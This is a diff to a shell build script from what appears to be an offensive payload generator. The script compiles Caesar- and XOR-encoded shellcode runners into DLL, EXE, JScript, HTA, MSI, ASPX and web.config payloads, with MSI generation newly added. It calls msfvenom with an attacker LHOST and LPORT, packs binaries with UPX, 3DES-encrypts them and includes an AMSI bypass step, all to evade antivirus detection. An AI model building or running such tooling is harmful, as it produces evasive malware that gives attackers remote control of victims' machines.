@@ -68,7 +68,7 @@ sed -i 's/unsigned char enc_payload.. . .*./unsigned char enc_payload[] = { '"${
 
 
 # Compile Shellcode Runner as DLL
-echo "[+] Creating DLL files..."
+echo "[+] Creating DLL ..."
 mcs -target:library -out:payloads/Caesar/shellcode_runner_assembly.dll Templates/Caesar/shellcode_runner_assembly.cs &>/dev/null
 mcs -target:library -out:payloads/Caesar/shellcode_runner_assembly_numa.dll Templates/Caesar/shellcode_runner_assembly_numa.cs &>/dev/null
 mcs -target:library -out:payloads/Caesar/shellcode_runner_assembly_numa_marshal.dll Templates/Caesar/shellcode_runner_assembly_numa_marshal.cs &>/dev/null
@@ -83,7 +83,7 @@ mcs -target:library -out:payloads/XOR/shellcode_runner_assembly_FlsAlloc_marshal
 #cp ExampleAssembly.dll payloads/
 
 # Complile the Shellcode Runner as EXE
-echo "[+] Creating EXE file ..."
+echo "[+] Creating EXE ..."
 mcs -out:payloads/Caesar/shellcode_runner_assembly.exe Templates/Caesar/shellcode_runner_assembly.cs &>/dev/null
 mcs -out:payloads/Caesar/shellcode_runner_assembly_numa.exe Templates/Caesar/shellcode_runner_assembly_numa.cs &>/dev/null
 mcs -out:payloads/Caesar/shellcode_runner_assembly_numa_marshal.exe Templates/Caesar/shellcode_runner_assembly_numa_marshal.cs &>/dev/null
@@ -101,7 +101,7 @@ upx -9 payloads/XOR/shellcode_runner_cpp.exe &>/dev/null
 
 
 # Generate a payload
-echo "[+] Creating JS file ..."
+echo "[+] Creating JS ..."
 mono DotNetToJScript.exe payloads/XOR/shellcode_runner_assembly.dll --lang=Jscript --ver=v4 -o payloads/DotNetToJScript/runner.js -c Runner.TestClass &>/dev/null
 
 
@@ -109,14 +109,21 @@ mono DotNetToJScript.exe payloads/XOR/shellcode_runner_assembly.dll --lang=Jscri
 #echo "[+] shellcode_runner.js copied to Payloads"
 tr -d $'\r' < payloads/DotNetToJScript/runner.js > payloads/DotNetToJScript/shellcode_runner.js
 
-echo "[+] Creating HTA file ..."
+echo "[+] Creating HTA ..."
 python add_code.py
 
-echo "[+] Creating XSL file ..."
+echo "[+] Creating XSL ..."
 
-echo "[+] Creating TXT file ..."
+echo "[+] Creating TXT ..."
 cp Templates/AMSI/amsi_runner_template.txt payloads/AMSI/shellcode_runner.txt
 sed -i 's/SHELLCODE/'"${SHELLCODE}"'/g' payloads/AMSI/shellcode_runner.txt
+
+echo "[+] Creating MSI ..."
+mono Templates/MSI/wix311-binaries/candle.exe -out Templates/MSI/ -arch x64 Templates/MSI/shellcode_runner.xml &>/dev/null
+wine Templates/MSI/wix311-binaries/light.exe -out Templates/MSI/shellcode_runner.msi Templates/MSI/shellcode_runner.wixobj -sval &>/dev/null
+rm Templates/MSI/shellcode_runner.wixpdb
+rm Templates/MSI/shellcode_runner.wixobj
+mv Templates/MSI/shellcode_runner.msi payloads/MSI/shellcode_runner.msi 
 
 echo "[+] Creating web.config file (Non-Encrypted)..."
 MSFVENOM=" -p $MSFVENOM_PAYLOAD LHOST=$LHOST LPORT=$LPORT -f aspx -o payloads/ASPX/shellcode_runner.aspx"
@@ -124,7 +131,7 @@ msfvenom$MSFVENOM &>/dev/null
 python add_code2.py
 
 echo "[+] Creating ASPX file (Non-Encrypted) ..."
-echo "[+] Unhooking AMSI ..."
+echo "[+] AMSI bypass (Patching, Unhooking) ..."
 echo "[+] Generating a 3DES Shellcode Runner ..."
 pwsh -c ". ./Templates/3DES/TripleDESEncryptor.ps1;TripleDESEncryption -Password oqphnbt0kuedizy4m3avx6r5lf21jc8s -Salt vh9b4tsxrl1560wg8nda2meuc7yjzop3 -File 'payloads/XOR/shellcode_runner_assembly.exe' -EncryptedBinaryFile 'payloads/3DES/shellcode_runner_assembly_3des.exe'" &>/dev/null
 pwsh -c ". ./Templates/3DES/TripleDESEncryptor.ps1;TripleDESEncryption -Password oqphnbt0kuedizy4m3avx6r5lf21jc8s -Salt vh9b4tsxrl1560wg8nda2meuc7yjzop3 -File 'payloads/XOR/shellcode_runner_assembly_numa_marshal.exe' -EncryptedBinaryFile 'payloads/3DES/shellcode_runner_assembly_numa_marshal_3des.exe'" &>/dev/null
